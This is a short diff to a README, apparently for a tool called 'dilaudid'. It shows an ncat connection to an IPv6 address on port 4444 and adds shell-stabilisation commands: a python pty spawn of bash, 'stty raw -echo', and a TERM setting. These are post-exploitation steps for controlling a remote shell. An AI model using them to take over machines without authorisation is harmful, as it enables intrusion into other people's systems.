@@ -33,6 +33,17 @@ You can connect remotely now (ipv6 only)
 ```
 ncat 2601:603:a7c:71c0:baba:19db:8655:2938 4444
 ```
+Follow these instructions for a fully functional terminal
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+press cntrl + Z to background
+```
+stty raw -echo;fg
+```
+```
+export TERM=xterm-256color
+```
 Compile dilaudid-uninstall
 ```
 gcc -static -o dilaudid-uninstall dilaudid-uninstall.c
